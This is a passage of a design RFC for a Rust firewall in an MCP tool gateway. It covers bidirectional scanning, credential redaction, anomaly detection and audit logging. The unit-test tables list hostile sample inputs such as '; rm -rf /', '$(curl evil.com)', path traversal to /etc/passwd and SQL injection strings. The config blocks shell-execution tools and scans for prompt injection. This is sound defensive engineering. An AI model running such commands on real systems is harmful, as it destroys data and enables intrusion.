    anomaly_detection: false    # opt-in: needs accumulated transition data
    anomaly_threshold: 0.7     # 0.0-1.0, higher = more lenient
    audit_log: ~/.mcp-gateway/audit.jsonl

    # Per-tool/pattern rules (first match wins).
    # Rules support full glob patterns via the `glob` crate:
    # `*` (any chars), `?` (single char), `[abc]` (char class), `{a,b}` (alternation).
    rules:
      # Block all shell execution tools by default
      - match: "exec_*"
        action: block
        reason: "Shell execution tools blocked by default"

      # Block destructive operations (require_approval deferred to future RFC)
      - match: "*_delete*"
        action: block
        reason: "Destructive operations blocked by default"

      # Scan everything for credentials and prompt injection
      - match: "*"
        action: warn
        scan: [credentials, pii, prompt_injection]
```

### Rust config type addition:

```rust
// In src/config/features.rs, modify SecurityConfig:

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct SecurityConfig {
    pub sanitize_input: bool,
    pub ssrf_protection: bool,
    pub tool_policy: ToolPolicyConfig,
    /// Firewall configuration (RFC-0071).
    #[serde(default)]
    pub firewall: crate::security::firewall::FirewallConfig,
}
```

---

## 6. Performance Budget

The firewall MUST add less than 1ms per request. Budget breakdown:

| Component | Target | Technique |
|-----------|--------|-----------|
| Input scanning (6 shell + 6 path + 4 SQL patterns) | <100us | `RegexSet` compiled once, O(n) single pass |
| Response scanning (23 patterns) | <200us | Existing `RegexSet` in `ResponseScanner` |
| Credential scanning (11 patterns) | <100us | `RegexSet` compiled once |
| Anomaly scoring | <50us | `DashMap` lookup + arithmetic |
| Audit logging | <100us | Buffered append to file, no fsync per entry |
| Rule matching | <10us | Linear scan of typically 3-10 rules |
| **Total** | **<560us** | **Well within 1ms budget** |

All pattern matching uses `regex::RegexSet` which compiles all patterns into
a single DFA and matches them in a single pass. The existing `ResponseScanner`
already proves this approach is fast enough (tested on 2000+ requests in CI).

---

## 7. Testing Strategy

### 7.1 Unit Tests (inline `#[cfg(test)]`)

**Input Scanner Tests:**
| Test | Validates |
|------|-----------|
| `detects_shell_injection_semicolon` | `; rm -rf /` in args |
| `detects_shell_injection_backtick` | Backtick command substitution |
| `detects_command_substitution` | `$(curl evil.com)` |
| `detects_path_traversal` | `../../../etc/passwd` |
| `detects_url_encoded_traversal` | `..%2f..%2f` variant |
| `detects_sql_tautology` | `' OR 1=1` |
| `detects_stacked_query` | `; DROP TABLE` |
| `clean_args_no_findings` | Normal args produce zero findings |
| `nested_json_scanned_recursively` | Injection in nested object |

**Redactor Tests:**
| Test | Validates |
|------|-----------|
| `detects_aws_access_key` | AKIA... pattern |
| `detects_github_pat` | ghp_... pattern |
| `detects_jwt_in_response` | eyJ... pattern |
| `detects_private_key` | BEGIN PRIVATE KEY |
| `redacts_credential_in_place` | String replaced with [REDACTED:credential] |
| `clean_response_no_redaction` | Normal text passes through |
| `nested_credential_redacted` | Credential in nested JSON |

**Anomaly Detector Tests:**
| Test | Validates |
|------|-----------|
| `cold_start_returns_neutral` | No data -> 0.5 score |
| `frequent_transition_low_score` | Known pair -> low anomaly |
| `never_seen_transition_high_score` | Unknown pair -> high anomaly |

**Firewall Core Tests:**
| Test | Validates |
|------|-----------|
| `disabled_firewall_allows_everything` | enabled=false -> all pass |
| `high_severity_finding_blocks` | Shell injection -> block |
| `medium_severity_finding_warns` | SQL injection -> warn |
| `rule_overrides_default_action` | Custom rule changes behavior |
| `glob_rule_matches_prefix` | `exec_*` matches `exec_command` |
| `wildcard_rule_matches_all` | `*` matches everything |
| `response_scan_disabled` | scan_responses=false -> skip |
| `verdict_contains_all_findings` | Multiple findings aggregated |

**Audit Logger Tests:**
| Test | Validates |
|------|-----------|
| `audit_entry_is_valid_json` | Each line parses as JSON |
| `audit_contains_required_fields` | timestamp, tool, action present |
| `audit_args_hash_not_raw_value` | Arguments hashed, not logged raw |

### 7.2 Integration Test (tests/firewall_integration.rs)

```rust
#[tokio::test]
async fn firewall_blocks_shell_injection_in_request() {
    // Start gateway with firewall enabled
    // Send tool call with `; rm -rf /` in args
    // Verify 400 error with firewall blocking message
}

#[tokio::test]
async fn firewall_redacts_credential_in_response() {
    // Start gateway with mock backend that returns AWS key
    // Send normal tool call
    // Verify response contains [REDACTED:credential] instead of key
}

#[tokio::test]
async fn firewall_audit_log_written() {
    // Start gateway with audit log pointing to tempfile
    // Send tool call
    // Verify NDJSON line in audit file
}
```

---

## 8. Design Characteristics

### 8.1 What this creates

This design combines several firewall behaviors in one MCP layer:

1. Bidirectional scanning (request args AND response content)
2. Credential redaction in tool outputs before LLM ingestion
3. Anomaly detection from tool invocation sequences
4. Structured audit trail with argument hashing (privacy-preserving)
5. Three-tier action model (block/warn/log) to minimize false positives

## 9. Risk Register

| # | Risk | Probability | Impact | Mitigation |
|---|------|-------------|--------|------------|
| R1 | False positive blocking breaks legitimate tools | Medium | High | Default to WARN not BLOCK; zero-FP tolerance for blocking tier |
| R2 | Regex performance degradation with many patterns | Low | Medium | `RegexSet` compiles to single DFA; benchmark in CI |
| R3 | Audit log disk exhaustion | Medium | Low | Configurable path; add log rotation docs; default off until path set |
| R4 | Credential patterns miss new formats | High | Medium | Patterns are data, not code; easy to add via config rules |
| R5 | Anomaly detection generates noise early (cold start) | High | Low | Default disabled; requires opt-in + minimum transition data |
| R6 | Redaction corrupts JSON structure | Low | High | Redaction replaces string VALUES only, never keys or structure |
| R7 | Prompt injection patterns evolve faster than regex | High | Medium | Response scanner patterns are a living list; contribute upstream findings |
| R8 | Performance budget exceeded in pathological cases | Low | Medium | Per-value size limit (skip strings >1MB); total scan timeout |

---

## Cross-Reference: Access Control Decision Matrix

See **RFC-0073 section 2.0** for the unified Access Control Decision Matrix
documenting how Routing Profiles, Tool Profiles, and the Firewall interact.
The firewall operates at the security enforcement layer: it blocks invocations
based on pattern-based request/response scanning but does not affect tool
discovery.

---

## ADR-0071: Security Firewall Architecture

### Context

The gateway needs runtime security inspection of tool calls. Three approaches
were considered:

1. **External sidecar**: Separate security proxy between gateway and backends
2. **Middleware layer**: axum middleware that wraps the handler
3. **Embedded engine**: Library-level engine called from handlers

### Decision

**Embedded engine** (option 3). The `Firewall` struct is a plain library type
with `check_request` / `check_response` methods, called explicitly from the
handler code.

Rationale:
- Middleware approach would require buffering + deserializing the full response
  body, adding latency and memory pressure
- External sidecar doubles the network hops and operational complexity
- Embedded engine has access to full request context (session, caller, tool
  metadata) without serialization overhead
- Matches the existing pattern: `ToolPolicy::check()`, `sanitize_json_value()`,
  and `ResponseScanner::scan_response()` are all called explicitly from handlers

### Consequences

- Handler code has explicit firewall calls (2 call sites: pre-invoke, post-invoke)
- Firewall can be bypassed in `passthrough` mode (same as existing policy/sanitize)
- Testing is simpler: unit test the engine directly, no need to spin up HTTP server

---

## Shared Prerequisites

**Prerequisite**: Implement session disconnect callback in `src/gateway/server.rs` that notifies all per-session state holders. All RFCs adding per-session DashMap entries MUST register a cleanup handler.

---

## Implementation Order

1. Create `src/security/firewall/mod.rs` with types and `FirewallConfig` (~100 LOC)
2. Implement `InputScanner` with shell/path/SQL patterns (~150 LOC)
3. Implement `Redactor` with credential patterns (~120 LOC)
4. Implement `AnomalyDetector` using `TransitionTracker` (~50 LOC)
5. Implement `AuditLogger` with NDJSON output (~120 LOC)
6. Wire `Firewall::from_config` + `check_request` + `check_response` (~150 LOC)
7. Add `FirewallConfig` to `SecurityConfig` in config/features.rs (~10 LOC)
8. Add `Arc<Firewall>` to `AppState` and call from handlers (~50 LOC)
9. Write unit tests (~200 LOC across modules)
10. Write integration test (~100 LOC)

**Total: ~1050 LOC** (within 800-1200 budget)
